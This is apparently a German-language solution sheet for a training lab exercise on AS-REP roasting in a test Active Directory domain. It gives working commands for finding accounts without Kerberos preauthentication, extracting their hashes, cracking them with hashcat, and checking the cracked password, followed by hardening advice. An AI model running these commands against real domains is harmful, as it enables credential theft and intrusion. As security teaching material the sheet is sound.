# Lösung – Übung 05: AS-REP Roasting

`<DC>` = DC-IP, Domäne `lab.local`.

## 1. Preauth-lose Accounts finden

```bash
# ohne Credentials, mit Userliste:
GetNPUsers.py lab.local/ -dc-ip <DC> -usersfile users.txt -no-pass
# mit Credentials (alle im AD finden):
GetNPUsers.py lab.local/mmuster:'Passwort' -dc-ip <DC> -request
# netexec:
netexec ldap <DC> -u mmuster -p 'Passwort' --asreproast asrep.txt
```

## 2. AS-REP extrahieren

`GetNPUsers.py ... -request` gibt direkt den crackbaren Hash aus:
```
$krb5asrep$23$mmuster@LAB.LOCAL:a1b2...$c3d4...
```
In Datei `asrep.hash` speichern.

## 3. Cracken

```bash
hashcat -m 18200 -a 0 asrep.hash /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.hash --show
```

## 4. Verifizieren

```bash
netexec smb <DC> -u mmuster -p '<gecracktes_pw>'
```

## 5. Warum ohne Creds / Schutz

Der DC gibt die AS-REP für Preauth-lose Accounts **ohne** Passwortnachweis heraus → man braucht nur den **Usernamen** (aus Enum/kerbrute). Der mitgelieferte, mit dem User-Schlüssel verschlüsselte Teil ist offline angreifbar.
**Schutz:** „Do not require Kerberos preauth" **nirgends** setzen (Preauth überall an), starke/zufällige Passwörter (dann Crack aussichtslos), Monitoring auf ungewöhnliche AS-REQ/4768.

## Härtung

- Preauth erzwingen, Service-/Legacy-Accounts prüfen (oft historisch ohne Preauth), lange Passwörter/gMSA.

## Häufige Fehler / Troubleshooting

- **„KDC_ERR_C_PRINCIPAL_UNKNOWN":** Username existiert nicht → kerbrute-Liste.
- **Clock-Skew:** Zeit sync (Kerberos).
- **Kein Treffer beim Cracken:** starkes Passwort → im Report als „nicht crackbar" vermerken (= gut).
- **Mode falsch:** AS-REP = **18200**, nicht 13100 (TGS/Kerberoast).
